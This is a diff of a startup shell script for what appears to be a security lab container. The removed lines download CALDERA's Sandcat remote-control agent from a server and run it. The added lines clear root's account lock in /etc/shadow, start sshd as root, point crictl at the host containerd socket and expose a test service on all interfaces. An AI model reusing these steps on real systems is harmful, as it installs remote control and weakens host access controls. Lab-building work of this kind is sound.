@@ -1,80 +1,110 @@
-#!/usr/bin/env bash
-set -euo pipefail
+#!/bin/sh
+set -eu
 
-CALDERA_URL="${CALDERA_URL:-http://caldera.dock:8888}"
-GROUP="${GROUP:-cluster}"
-CALDERA_WAIT_TIMEOUT_SEC="${CALDERA_WAIT_TIMEOUT_SEC:-300}"
-CALDERA_WAIT_INTERVAL_SEC="${CALDERA_WAIT_INTERVAL_SEC:-2}"
-SANDCAT_PATH="${SANDCAT_PATH:-/tmp/sandcat}"
+SSH_PORT="${SSH_PORT:-4222}"
+RUNTIME_SOCKET="${CRICTL_RUNTIME_PATH:-/host/run/containerd/containerd.sock}"
+TEST_SERVICE_HOST="${SERVICE_HOST:-0.0.0.0}"
+TEST_SERVICE_PORT="${TEST_SERVICE_LISTEN_PORT:-2525}"
+TEST_SERVICE_LOG="${TEST_SERVICE_LOG:-/var/log/pcf-test-service.log}"
 
-is_reachable() {
-  local url="$1"
-
-  if command -v wget >/dev/null 2>&1; then
-    wget -qO- "${url}" >/dev/null
-    return $?
-  fi
-
-  if command -v curl >/dev/null 2>&1; then
-    curl -fsS -o /dev/null -X GET "${url}"
-    return $?
-  fi
-
-  echo "Neither wget nor curl is available." >&2
-  return 1
+truthy() {
+  case "${1:-}" in
+    1|true|TRUE|True|yes|YES|Yes|y|Y|on|ON|On) return 0 ;;
+    *) return 1 ;;
+  esac
 }
 
-download_sandcat() {
-  if command -v wget >/dev/null 2>&1; then
-    wget -qO "${SANDCAT_PATH}" "${CALDERA_URL}/file/download" \
-      --header='file:sandcat.go' \
-      --header='platform:linux' \
-      --header="server:${CALDERA_URL}" \
-      --header="group:${GROUP}"
-    return $?
+ensure_crictl_config() {
+  if [ "$(id -u)" != "0" ]; then
+    echo "[prestart] not running as root; skipping crictl config."
+    return 0
   fi
 
-  if command -v curl >/dev/null 2>&1; then
-    curl -fsS -o "${SANDCAT_PATH}" "${CALDERA_URL}/file/download" \
-      -H 'file:sandcat.go' \
-      -H 'platform:linux' \
-      -H "server:${CALDERA_URL}" \
-      -H "group:${GROUP}"
-    return $?
-  fi
-
-  echo "Neither wget nor curl is available." >&2
-  return 1
+  cat >/etc/crictl.yaml <<YAML
+runtime-endpoint: unix://${RUNTIME_SOCKET}
+image-endpoint: unix://${RUNTIME_SOCKET}
+timeout: 10
+debug: false
+YAML
 }
 
-CALDERA_URL="${CALDERA_URL%/}"
-
-echo "Waiting for ${CALDERA_URL} timeout: ${CALDERA_WAIT_TIMEOUT_SEC}s ..."
-start_ts="$(date +%s)"
-
-until is_reachable "${CALDERA_URL}"; do
-  now_ts="$(date +%s)"
-
-  if (( now_ts - start_ts >= CALDERA_WAIT_TIMEOUT_SEC )); then
-    echo "Timed out waiting for ${CALDERA_URL} after ${CALDERA_WAIT_TIMEOUT_SEC}s" >&2
-    exit 1
+start_sshd() {
+  if [ "$(id -u)" != "0" ]; then
+    echo "[prestart] not running as root; skipping SSH service."
+    return 0
   fi
 
-  sleep "${CALDERA_WAIT_INTERVAL_SEC}"
-done
+  if ! command -v sshd >/dev/null 2>&1; then
+    echo "[prestart] sshd not installed; skipping SSH service."
+    return 0
+  fi
 
-echo "CALDERA is reachable."
+  mkdir -p /run/sshd /root/.ssh
+  chmod 0755 /run/sshd
+  chmod 0700 /root/.ssh
 
-echo "Downloading Sandcat payload..."
-download_sandcat
+  # The upstream Alpine image ships root locked in /etc/shadow.  OpenSSH
+  # rejects public-key auth for locked accounts even when password login is
+  # disabled, so clear only that lock marker for this controlled lab service.
+  if grep -q '^root:!' /etc/shadow 2>/dev/null; then
+    sed -i 's/^root:![^:]*:/root::/' /etc/shadow
+  fi
 
-chmod +x "${SANDCAT_PATH}"
+  if [ -f /root/.ssh/authorized_keys ]; then
+    chmod 0600 /root/.ssh/authorized_keys
+  fi
 
-echo "Starting Sandcat agent in background..."
-"${SANDCAT_PATH}" &
+  ssh-keygen -A >/dev/null 2>&1 || true
 
-SANDCAT_PID="$!"
+  if ! grep -qE "^[[:space:]]*Port[[:space:]]+${SSH_PORT}([[:space:]]|$)" /etc/ssh/sshd_config 2>/dev/null; then
+    printf '\nPort %s\n' "${SSH_PORT}" >>/etc/ssh/sshd_config
+  fi
 
-echo "Sandcat agent started with PID ${SANDCAT_PID}"
+  if pgrep -x sshd >/dev/null 2>&1; then
+    echo "[prestart] sshd already running."
+    return 0
+  fi
+
+  /usr/sbin/sshd
+  echo "[prestart] sshd listening on ${SSH_PORT}."
+}
+
+start_test_service() {
+  if ! command -v python3 >/dev/null 2>&1; then
+    echo "[prestart] python3 not installed; skipping PCF test service."
+    return 0
+  fi
+
+  if [ ! -f /app/server.py ]; then
+    echo "[prestart] /app/server.py missing; skipping PCF test service."
+    return 0
+  fi
+
+  if pgrep -f "/app/server.py" >/dev/null 2>&1; then
+    echo "[prestart] PCF test service already running."
+    return 0
+  fi
+
+  if ! touch "${TEST_SERVICE_LOG}" 2>/dev/null; then
+    TEST_SERVICE_LOG="/tmp/pcf-test-service.log"
+    touch "${TEST_SERVICE_LOG}" 2>/dev/null || true
+  fi
+
+  SERVICE_HOST="${TEST_SERVICE_HOST}" \
+  SERVICE_LISTEN_PORT="${TEST_SERVICE_PORT}" \
+  nohup python3 /app/server.py >>"${TEST_SERVICE_LOG}" 2>&1 &
+
+  echo "[prestart] PCF test service listening on ${TEST_SERVICE_HOST}:${TEST_SERVICE_PORT}."
+}
+
+ensure_crictl_config
+
+if truthy "${SSH_ENABLE:-true}"; then
+  start_sshd
+fi
+
+if truthy "${TEST_SERVICE_ENABLE:-true}"; then
+  start_test_service
+fi
 
 exit 0
